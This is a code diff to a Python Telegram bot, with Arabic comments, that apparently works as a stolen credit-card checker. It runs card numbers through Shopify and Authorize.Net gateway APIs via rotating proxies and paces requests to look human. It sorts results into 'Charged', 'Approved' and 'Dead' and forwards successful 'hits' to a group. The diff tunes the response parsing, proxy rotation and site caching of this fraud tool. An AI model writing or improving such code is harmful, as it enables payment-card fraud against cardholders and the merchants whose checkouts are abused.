@@ -45,7 +45,8 @@ telegram.InlineKeyboardButton = CustomInlineKeyboardButton
 _original_to_dict = _original_inline_keyboard_button.to_dict
 def _patched_to_dict(self, *args, **kwargs):
     d = _original_to_dict(self, *args, **kwargs)
-    extra = BUTTON_REGISTRY.get(id(self))
+    # تنظيف تلقائي فوري لكل زر يتم تحويله لمنع أي تسريب للذاكرة نهائياً
+    extra = BUTTON_REGISTRY.pop(id(self), None)
     if extra:
         if extra.get('style'): d['style'] = extra['style']
         if extra.get('icon_custom_emoji_id'): d['icon_custom_emoji_id'] = extra['icon_custom_emoji_id']
@@ -86,14 +87,14 @@ JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
 # روابط الـ APIs النشطة
-SHOPIFY_API_URL_1 = 'https://web-production-3d364.up.railway.app/shopify'
+SHOPIFY_API_URL_1 = 'https://shopy-kappa-nine.vercel.app/check'
 AUTHNET_API_URL = 'https://authnet-4b3p.vercel.app/calc'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
 # التعديلات المطلوبة
 WORKERS = 40  
-DELAY = 13  
+DELAY = 10  
 HIT_DELAY = 1.0
 API_TIMEOUT = 60
 
@@ -262,7 +263,7 @@ COUNTRY_NAME_TO_CODE = {
     "NICARAGUA": "NI", "NIGER": "NE", "NIGERIA": "NG", "NIUE": "NU", "NORFOLK ISLAND": "NF", "NORTHERN MARIANA ISLANDS": "MP",
     "NORWAY": "NO", "OMAN": "OM", "PAKISTAN": "PK", "PALAU": "PW", "PALESTINIAN TERRITORY, OCCUPIED": "PS",
     "PALESTINE": "PS", "PANAMA": "PA", "PAPUA NEW GUINEA": "PG", "PARAGUAY": "PY", "PERU": "PE",
-    "PHILIPPINES": "PH", "PITCAIRN": "PN", "POLAND": "PL", "PORTUGAL": "PT", "PUERTO RICO": "PR",
+    "PHL": "PH", "PITCAIRN": "PN", "POLAND": "PL", "PORTUGAL": "PT", "PUERTO RICO": "PR",
     "QATAR": "QA", "REUNION": "RE", "ROMANIA": "RO", "RUSSIAN FEDERATION": "RU", "RUSSIA": "RU",
     "RWANDA": "RW", "SAINT HELENA": "SH", "SAINT KITTS AND NEVIS": "KN", "SAINT LUCIA": "LC",
     "SAINT PIERRE AND MIQUELON": "PM", "SAINT VINCENT AND THE GRENADINES": "VC", "SAMOA": "WS",
@@ -503,7 +504,7 @@ _LAST_SITES_FETCH = 0
 async def get_shopify_sites():
     global _CACHED_SHOPIFY_SITES, _LAST_SITES_FETCH
     now = time.time()
-    if _CACHED_SHOPIFY_SITES: 
+    if _CACHED_SHOPIFY_SITES and (now - _LAST_SITES_FETCH < 600): 
         return _CACHED_SHOPIFY_SITES
         
     if os.path.exists('sites.txt'):
@@ -511,6 +512,7 @@ async def get_shopify_sites():
             async with aiofiles.open('sites.txt', 'r', encoding='utf-8') as f:
                 _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await f.read()).split('\n') if l.strip()]))
                 if _CACHED_SHOPIFY_SITES:
+                    _LAST_SITES_FETCH = now
                     return _CACHED_SHOPIFY_SITES
         except Exception: pass
         
@@ -661,12 +663,17 @@ async def get_bin_info(bin_code, session=None):
                     if data and isinstance(data, dict): return data
                 return None
         
-        res = await fetch1(session) if (session and not session.closed) else await fetch1(aiohttp.ClientSession())
+        if session and not session.closed:
+            res = await fetch1(session)
+        else:
+            async with aiohttp.ClientSession() as tmp_session:
+                res = await fetch1(tmp_session)
+                
         if res and "country" in res:
             parsed = clean_bin_data({
                 "brand": res.get("brand", "-"),
                 "type": res.get("type", "-"),
-                "level": res.get("brand", "-"),
+                "level": res.get("level", "-"),
                 "bank": res.get("bank", "-"),
                 "country": res.get("country_name", res.get("country", "-")),
                 "country_code": res.get("country_flag", res.get("country_code", res.get("country_iso", ""))),
@@ -676,7 +683,7 @@ async def get_bin_info(bin_code, session=None):
             return parsed
     except Exception: pass
 
-    # 2. محاولة جلب الـ BIN من موقع HandyAPI (مع إصلاح خطأ الـ None)
+    # 2. محاولة جلب الـ BIN من موقع HandyAPI
     try:
         url2 = f"https://data.handyapi.com/bin/{b6}"
         async def fetch2(s):
@@ -684,7 +691,12 @@ async def get_bin_info(bin_code, session=None):
                 if r.status == 200: return await r.json()
                 return None
                 
-        res2 = await fetch2(session) if (session and not session.closed) else await fetch2(aiohttp.ClientSession())
+        if session and not session.closed:
+            res2 = await fetch2(session)
+        else:
+            async with aiohttp.ClientSession() as tmp_session:
+                res2 = await fetch2(tmp_session)
+                
         if res2 and res2.get("Status") == "SUCCESS":
             country_obj = res2.get("Country") or {}
             bank_obj = res2.get("Bank") or {}
@@ -709,7 +721,12 @@ async def get_bin_info(bin_code, session=None):
                 if r.status == 200: return await r.json()
                 return None
                 
-        res3 = await fetch3(session) if (session and not session.closed) else await fetch3(aiohttp.ClientSession())
+        if session and not session.closed:
+            res3 = await fetch3(session)
+        else:
+            async with aiohttp.ClientSession() as tmp_session:
+                res3 = await fetch3(tmp_session)
+                
         if res3:
             country_obj = res3.get("country") or {}
             bank_obj = res3.get("bank") or {}
@@ -726,7 +743,6 @@ async def get_bin_info(bin_code, session=None):
             return parsed
     except Exception: pass
 
-    # 4. إذا فشلت كل المواقع، ارجع القيمة الافتراضية
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "Unknown", "country_code": "", "flag": "🌐"}
 
 # ====================== SHOPIFY GATEWAY ENGINE ======================
@@ -758,14 +774,10 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             pr = "$5.00"
             rm = ""
             
-            if resp.status in [401, 504, 502, 503, 429, 422]:
-                return {'status': 'Site Error', 'message': f'API HTTP {resp.status}', 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
-            
-            if resp.status != 200:
-                return {'status': 'Site Error', 'message': f'API HTTP {resp.status}', 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
-            
+            is_json = False
             try: 
                 rj = json.loads(text_data)
+                is_json = True
                 rm = str(rj.get('response_msg', rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', '')))))))).strip()
                 gt = rj.get('Gateway', rj.get('gateway', 'Shopify'))
                 
@@ -775,6 +787,9 @@ async def check_shopify_api(api_url, card, site, proxy, session):
                         break
             except Exception: 
                 rm = text_data.strip()
+                
+            if not is_json and resp.status != 200:
+                return {'status': 'Site Error', 'message': f'API HTTP {resp.status}', 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
             
             if not pr:
                 price_match = re.search(r'\$\d+(?:\.\d{2})?', text_data)
@@ -782,23 +797,27 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             
             clean_rm = unsf(rm).lower()
             
+            if 'do not honor' in clean_rm:
+                rm = 'Card Declined'
+                clean_rm = 'card declined'
+            
+            if 'charged' in clean_rm or 'completed' in clean_rm or 'payment succeeded' in clean_rm or 'success' in clean_rm: 
+                return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': gt, 'price': pr}
+                
+            if '3d' in clean_rm or 'secure' in clean_rm or 'otp' in clean_rm:
+                return {'status': 'Dead', 'message': 'Card Declined', 'card': card, 'gateway': gt, 'price': pr}
+                
+            if 'approved' in clean_rm or any(k in clean_rm for k in ['invalid_cvv', 'match']): 
+                return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+                
+            if 'insufficient' in clean_rm or 'funds' in clean_rm or 'balance' in clean_rm:
+                return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': gt, 'price': pr}
+            
             if any(k in clean_rm for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
             
             if is_dead_site_error(rm) or any(k in clean_rm for k in ['proxy', 'timeout', 'bad gateway', 'max ret', 'step 0', 'missing', 'tunnel', 'cloudflare', '502', '503', '504', '401', '422', 'site error', 'not shopify', 'site not supported', 'requires login', 'cart failed', 'filed to', 'error possessing card', 'error processing card']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
-                
-            if 'insufficient' in clean_rm or 'funds' in clean_rm or 'balance' in clean_rm:
-                return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': gt, 'price': pr}
-                
-            if 'charged' in clean_rm or 'completed' in clean_rm or 'payment succeeded' in clean_rm or 'success' in clean_rm: 
-                return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': gt, 'price': pr}
-                
-            if '3d' in clean_rm or 'secure' in clean_rm or 'otp' in clean_rm:
-                return {'status': 'Approved', 'message': '3d_secure_required', 'card': card, 'gateway': gt, 'price': pr}
-                
-            if 'approved' in clean_rm or any(k in clean_rm for k in ['invalid_cvv', 'match']): 
-                return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
                 
             return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
         
@@ -822,8 +841,10 @@ async def check_authnet_api(card, proxy, session):
             text_data = await resp.text()
             
             pr = None
+            is_json = False
             try:
                 rj = json.loads(text_data)
+                is_json = True
                 rm = str(rj.get('response_msg', rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', text_data)))))))).strip()
                 
                 for k in ['Price', 'price', 'amount', 'Amount', 'amt', 'Amt', 'charged']:
@@ -833,11 +854,18 @@ async def check_authnet_api(card, proxy, session):
             except Exception:
                 rm = text_data.strip()
                 
+            if not is_json and resp.status != 200:
+                return {'status': 'Site Error', 'message': f'API HTTP {resp.status}', 'card': card, 'gateway': 'Authorize.Net', 'price': '$5.00', 'retry': True}
+                
             if not pr:
                 price_match = re.search(r'\$\d+(?:\.\d{2})?', text_data)
                 pr = price_match.group(0) if price_match else "$5.00"
                 
             clean_rm = unsf(rm).lower()
+            
+            if 'do not honor' in clean_rm:
+                rm = 'Card Declined'
+                clean_rm = 'card declined'
             
             if any(k in clean_rm for k in ['this transaction has been approved', 'charged', 'success', 'payment succeeded', 'completed']):
                 return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
@@ -846,15 +874,15 @@ async def check_authnet_api(card, proxy, session):
                 return {'status': 'Insufficient', 'message': 'Insufficient Funds', 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
                 
             if any(k in clean_rm for k in ['authentication_required', '3d', 'secure', 'verification', 'otp', 'held for review', 'review']):
-                return {'status': 'Approved', 'message': '3D Secure Required', 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
+                return {'status': 'Dead', 'message': 'Card Declined', 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
                 
-            if any(k in clean_rm for k in ['the transaction was declined', 'declined', 'card declined', 'do not honor', 'stolen', 'lost', 'expired', 'invalid number', 'suspected fraud', 'card code is invalid']):
+            if any(k in clean_rm for k in ['the transaction was declined', 'declined', 'card declined', 'stolen', 'lost', 'expired', 'invalid number', 'suspected fraud', 'card code is invalid']):
                 return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
                 
             if any(k in clean_rm for k in ['error', 'timeout', 'proxy', 'bad gateway', 'cloudflare', 'system unavailable', '504', '401', '422', 'site error', 'cart failed', 'error possessing card']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr, 'retry': True}
                 
-            return {'status': 'Dead', 'message': rm if rm else 'Transaction Declined', 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
+            return {'status': 'Dead', 'message': rm if rm else 'Card Declined', 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
             
     except asyncio.TimeoutError:
         return {'status': 'Site Error', 'message': 'AuthNet API Timeout', 'card': card, 'gateway': 'Authorize.Net', 'price': '$5.00', 'retry': True}
@@ -876,7 +904,10 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
         if gateway_name == "AuthNet":
             last_res = {'status': 'Dead', 'message': 'API Error', 'card': card}
             for attempt in range(3): 
-                p = random.choice(proxies)['proxy_url'] if proxies else None
+                p = None
+                if proxies:
+                    try: p = random.choice(proxies)['proxy_url']
+                    except IndexError: p = None
                 r = await check_authnet_api(card, p, session)
                 if r.get('status') == 'Site Error':
                     last_res = r
@@ -887,12 +918,15 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
         lr = None
         tried_sites = set()
         for attempt in range(max_retries):
-            if not proxies: 
-                p = None
-                p_dict = None
-            else:
-                p_dict = random.choice(proxies)
-                p = p_dict['proxy_url']
+            p_dict = None
+            p = None
+            if proxies:
+                try:
+                    p_dict = random.choice(proxies)
+                    p = p_dict['proxy_url']
+                except IndexError:
+                    p_dict = None
+                    p = None
             
             acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS and s not in tried_sites]
             if not acs: 
@@ -910,6 +944,10 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                 
                 clean_msg = unsf(msg).lower()
                 
+                if status in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
+                    _SITE_ERRORS_COUNT[s] = max(0, _SITE_ERRORS_COUNT.get(s, 0) - 1)
+                    return r
+
                 if any(k in clean_msg for k in ['404', 'login', 'requires login', 'not shopify', 'site not supported', '422', 'cart failed', 'filed to', 'error possessing card']):
                     _SITE_ERRORS_COUNT[s] = _MAX_SITE_ERRORS + 5 
                     lr = r
@@ -917,7 +955,8 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                 
                 if any(k in msg for k in ['proxy', 'tunnel', 'connection close', 'format error', 'max retries', 'bad gateway', 'timeout']):
                     if p_dict and p_dict in proxies:
-                        proxies.remove(p_dict)  
+                        try: proxies.remove(p_dict)  
+                        except ValueError: pass
                     lr = r
                     continue
 
@@ -933,10 +972,6 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
             else:
                 return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
             
-            if status in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
-                _SITE_ERRORS_COUNT[s] = max(0, _SITE_ERRORS_COUNT.get(s, 0) - 1)
-                return r
-                
             lr = r
             
         if lr: return lr
@@ -1162,7 +1197,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await asyncio.gather(*tasks)
                 
         deleted_count = 0
-        for idx in sorted(dead_indices, reverse=True):
+        for idx in sorted(list(set(dead_indices)), reverse=True):
             await remove_proxy_by_index(uid, idx)
             deleted_count += 1
             
@@ -1404,7 +1439,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             res_msg = f"""<b>{CE_CROWN} {sf('Gates Purge Completed')} {CE_PARTY}</b>
             
 ├ <b>{sf('Total Loaded')}:</b> <code>{sf(str(len(raw_sites)))}</code>
-├ <b>{CE_CHECK} {sf('Active & Clean')}:</b> <code>{sf(str(working_sites))}</code>
+├ <b>{CE_CHECK} {sf('Active & Clean')}:</b> <code>{sf(str(len(working_sites)))}</code>
 ├ <b>{CE_SHIELD} {sf('Captcha/CF Blocked')}:</b> <code>{sf(str(captcha_count))}</code>
 ╰ <b>{CE_CLOWN} {sf('Purged Dead')}:</b> <code>{sf(str(dead_count))}</code>
 
@@ -1535,6 +1570,9 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
 
     # قفل التوازن المتسلسل (Sequential Pacing Lock) للتحكم بالـ CPM بدقة بالغة
     pacing_lock = asyncio.Lock()
+    
+    # مصفوفة لتجميع مهام إرسال الـ Hits لضمان اكتمالها بالكامل قبل تدمير الجلسة
+    hit_tasks = []
 
     async def dashboard_updater():
         while not is_stopped():
@@ -1575,10 +1613,9 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
             except Exception: break
             async with sem:
                 try:
-                    # محرك تنظيم التدفق المتسلسل: يفرض فاصلاً زمنياً بين كل بطاقة وأخرى لثبات الـ CPM حوالي 50-60
+                    # محرك تنظيم التدفق المتسلسل لثبات الـ CPM حوالي 50-60
                     async with pacing_lock:
                         if not is_stopped():
-                            # النوم 1.0 إلى 1.25 يعطينا بدقة متناهية من 50 إلى 60 طلب في الدقيقة بشكل مريح وبشري
                             await asyncio.sleep(random.uniform(1.0, 1.25))
                     
                     if is_stopped(): break
@@ -1591,6 +1628,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     
                     if status == 'Site Error':
                         chk += 1
+                        err += 1
                         continue
                         
                     chk += 1
@@ -1599,7 +1637,8 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     
                     if status == 'Charged':
                         chg += 1
-                        asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
+                        ht_task = asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
+                        hit_tasks.append(ht_task)
                     elif status == 'Approved': 
                         app += 1
                     elif status == 'Insufficient': 
@@ -1609,16 +1648,19 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                 except asyncio.CancelledError: break
                 except Exception: 
                     chk += 1
+                    err += 1
                 finally:
                     queue.task_done()
             
-            # مجرد تسليم بسيط لـ loop دون أي تأخير تعسفي إضافي لأن التوازن يحدث في pacing_lock بالأعلى
             await asyncio.sleep(0.01)
 
     wt = [asyncio.create_task(worker(i)) for i in range(current_workers)]
     process_store[uid]["tasks"] = wt + [ut]
     await asyncio.gather(*wt, return_exceptions=True)
     if not ut.done(): ut.cancel()
+    
+    if hit_tasks:
+        await asyncio.gather(*hit_tasks, return_exceptions=True)
         
     el = int(time.time() - st)
     h, m, s = el // 3600, (el % 3600) // 60, el % 60
@@ -1664,7 +1706,7 @@ async def post_init(app: Application):
     asyncio.create_task(check_sites_loop())
 
 def main():
-    bot_defaults = Defaults(parse_mode=ParseMode.HTML, link_preview_options=True)
+    bot_defaults = Defaults(parse_mode=ParseMode.HTML, link_preview_options=LinkPreviewOptions(is_disabled=True))
     app = Application.builder().token(BOT_TOKEN).defaults(bot_defaults).read_timeout(60).write_timeout(60).connect_timeout(60).post_init(post_init).build()
     app.add_error_handler(global_error_handler)
     
